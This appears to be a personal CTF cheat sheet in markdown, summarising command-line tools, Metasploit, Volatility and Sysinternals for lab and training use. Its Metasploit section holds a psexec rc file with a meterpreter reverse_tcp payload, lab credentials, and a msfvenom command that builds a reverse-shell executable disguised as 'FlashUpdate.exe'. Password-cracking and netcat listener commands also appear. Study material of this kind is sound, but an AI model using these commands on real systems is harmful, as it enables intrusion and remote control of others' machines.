# CTF Cheat Sheet <!-- omit in toc -->

- [Command Line Interface](#command-line-interface)
  - [Linux CLI](#linux-cli)
  - [Windows CLI](#windows-cli)
  - [OS Agnostic CLI](#os-agnostic-cli)
- [Frameworks](#frameworks)
  - [Metasploit](#metasploit)
  - [Volatility Framework](#volatility-framework)
- [GUI Applications](#gui-applications)
  - [Linux GUI Applications](#linux-gui-applications)
  - [Windows GUI Applications](#windows-gui-applications)
  - [OS Agnostic GUI Applications](#os-agnostic-gui-applications)
- [Cloud Tools](#cloud-tools)

# Command Line Interface
## Linux CLI

### A <!-- omit in toc -->
#### awk <!-- omit in toc -->
`awk -F: '{print $1}'` prints the first field when a file is separated by :
- `-F` define the Field Separator
  - `awk -F:` will split whatever you give it on the `:` character
- `'{print $1}'` prints field 1
  - the number can be swapped out from 0 to however many columns exist when the line is split based on the field separator

### C <!-- omit in toc -->
#### curl <!-- omit in toc -->
`curl http://some_website_or_ip` downloads the files located on some website or ip

### G <!-- omit in toc -->
#### grep <!-- omit in toc -->
`grep "some string" /path/to/file` looks for some string in file
- `-e` allows for the use of regex
  - `egrep` is a similar command to `grep -e` but with a few different options.
- `-i` case insensitive mode
- `-v` returns the contents of the file _without_ the matching lines

#### head <!-- omit in toc -->
`head somefile` prints the top lines of the file
- `-1` through `-20` will print the top _n_ lines of the file, based on what number follows the -

### J <!-- omit in toc -->
#### john <!-- omit in toc -->
`john some_file_of_credentials` attempts to crack passwords
- `--format=FORMAT` tells john what format the credentials are
- `--wordlist=/path/to/wordlist.txt` tells john which wordlist to use

#### jq <!-- omit in toc -->
`jq {some_regex_pattern} some_json_file.json` parses the json file and returns key/value pairs that match `some_regex_pattern`

### L <!-- omit in toc -->
#### less <!-- omit in toc -->
`less somefile` prints an amount of lines in the file

### M <!-- omit in toc -->
#### man <!-- omit in toc -->
`man some_command` shows the manual pages for some_command, if they exist

#### masscan <!-- omit in toc -->
`sudo masscan {NETWORK_ID/CIDR}` scans a large range of IPs very quickly
- `-p` define the ports to scan

#### md <!-- omit in toc -->5sum
`md5sum some_file` calculates the MD5 sum of some_file

### N <!-- omit in toc -->
#### nano <!-- omit in toc -->

#### netstat <!-- omit in toc -->
`netstat` shows network statistics
- `-l`
- `-n`
- `-p`
  
#### nmap <!-- omit in toc -->
`nmap {IP_ADDR or NETWORK_ID/CIDR}` scans the given IP Address or Network range
```bash
nmap 192.168.0.1
nmap 192.168.0.1-254
nmap 192.168.0.1/24
```
- `-p` defines the ports to scan
  - `-p-` scan all ports
  - `-p 21,22,23,80,443` scans the ports from a list
  - `-p 0-1023` scans the ports in a range
  - `-p 21-25,80,443,445` hybrid of list and range 
- `--reason`
- `-sV`
- `-T5`

### R <!-- omit in toc -->
#### recon-ng <!-- omit in toc -->
OSINT tool

### S <!-- omit in toc -->
#### sed <!-- omit in toc -->
`sed "s/somepattern/replacement/" file_or_string` replaces instances of somepattern with replacement 

#### script <!-- omit in toc -->
enables logging of the current shell

### T <!-- omit in toc -->
#### tail <!-- omit in toc -->
`tail somefile` prints the bottom lines of the file
- `-1` through `-20` will print the bottom _n_ lines of the file, based on what number follows the -

#### tcpdump <!-- omit in toc -->
- `-n` disables name resolution

### W <!-- omit in toc -->
#### w <!-- omit in toc -->
`w` prints a list of all currently logged on users and what they're doing
#### who <!-- omit in toc -->
`who` prints a list of all currently logged on users

### Z <!-- omit in toc -->
#### zgrep <!-- omit in toc -->
`zgrep 'somestring' some_compressed_file.gz` looks through a compressed file or archive to find specific text

## Windows CLI

### C <!-- omit in toc -->
#### certutil <!-- omit in toc -->
`certutil -hashfile some_file MD5` calculates the MD5 hash of some_file

### N <!-- omit in toc -->
#### netstat <!-- omit in toc -->
`netstat` shows network statistics
- `-a`
- `-n`
- `-o`

### S <!-- omit in toc -->
#### schtasks <!-- omit in toc -->

#### Sysinternals <!-- omit in toc -->
These tools from the Sysinternals library run as CLI. When possible use 64bit versions.
- Procdump
- PsExec
- PsList
- Strings

## OS Agnostic CLI

### H <!-- omit in toc -->
#### hashcat <!-- omit in toc -->
`hashcat some_file_of_hashes some_wordlist` attempts to crack the hashes using the provided wordlist
- `-a` sets hashcat to attack mode (used when cracking passwords)
- `-h` shows the help menu (useful for finding which hashing mode you want to use)
- `-m` sets the hashing mode

### N <!-- omit in toc -->
#### netcat <!-- omit in toc -->, ncat, nc
`netcat 192.168.0.2 4444` makes a connection to 192.168.0.2 on port 4444
- `-lp {PORT}` opens listener on `{PORT}`
- `-v` turns on verbose mode
- `-u` forces udp traffic

### W <!-- omit in toc -->
#### whoami <!-- omit in toc -->
`whoami` prints the username of whomever you're currently logged on as

---

# Frameworks
## Metasploit

### Automation <!-- omit in toc -->
Store raw msfconsole commands in `.rc` files and then execute them with `msfconsole -q -r some_rc_file.rc`.
Example rc file:
```
use exploit/windows/smb/psexec
set PAYLOAD windows/meterpreter/reverse_tcp
set RHOST 10.10.0.1
set SMBUSER sec504
set SMBPASS sec504
set LHOST 10.10.75.1
exploit
```

### msfconsole <!-- omit in toc -->
`msfconsole` launches the console
#### Arguments <!-- omit in toc -->
- `-q` launch in quiet mode (slightly faster)

#### Commands <!-- omit in toc -->
- `exploit` / `run`
  - attempts to run the exploit with the current options
- `search`
  - searches exploits, payloads, and other tools for the given string
- `set`
  - can be used to set the options for the exploit & payload, or used to choose which payload to send
    - `set LHOST 10.10.75.1`
    - `set PAYLOAD windows/meterpreter/reverse_tcp`
- `show options`
  - shows the options as currently configured
- `use`
  - sets the exploit
    - `use exploit/windows/smb/psexec`

### meterpreter <!-- omit in toc -->
  - `background` puts the current meterpreter session in the background

#### msfvenom <!-- omit in toc -->
Allows for the creation of specifically packaged and targeted malware.
- Example:
  - `msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=10.10.75.1 lport=4444 -f exe -o ./FlashUpdate.exe`

---

## Volatility Framework 
`vol.py` runs the volatility framework

---

# GUI Applications
## Linux GUI Applications
## B <!-- omit in toc -->
#### BeEF <!-- omit in toc -->
Used for website attacks. Many options and configurations

## Windows GUI Applications
### R <!-- omit in toc -->
#### RegEdit <!-- omit in toc -->
Registry Viewer
- `HKLM\Software\Microsoft\Windows\CurrentVersion\...`
  - `\Run` Starts the program every time someone logs in or system boots (need to figure out which)
  - `\RunOnce` Starts the program only once when someone logs in / system boots (need to figure out which) then removes this key from the registry

### S <!-- omit in toc -->
#### Services <!-- omit in toc -->.msc
Service Viewer. Useful for finding malicious services based on signing and privilege level.

#### Sysinternals <!-- omit in toc -->
These tools from the Sysinternals library run as GUI Apps. When possible, use the 64bit versions.
- `AutoRuns` Lists everything that starts when user logs in. BE SURE TO ENABLE WINDOWS SERVICES AND PROCESSES! 
- `Procexp` Shows heirarchial view of all processes (Useful to see if one program spawned a child program it shouldn't)
- `Procmon` Monitors just about everything going on in the processes. Filter down by the specific process that's suspicious.
- `TCPView` Shows all network traffic. Useful to see if a program that shouldn't be making network connections is sending or receiving traffic 

### T <!-- omit in toc -->
#### Task <!-- omit in toc --> Scheduler
Built-in windows task viewer. Can be used to see all the tasks and find malicious ones.

## OS Agnostic GUI Applications
### S <!-- omit in toc -->
#### Spiderfoot <!-- omit in toc -->
OSINT tool (WebAPP). Might not be used in CTF but still useful.

---

# Cloud Tools
## A <!-- omit in toc -->
### aws <!-- omit in toc -->
`aws` run commands on an amazon web service server

---

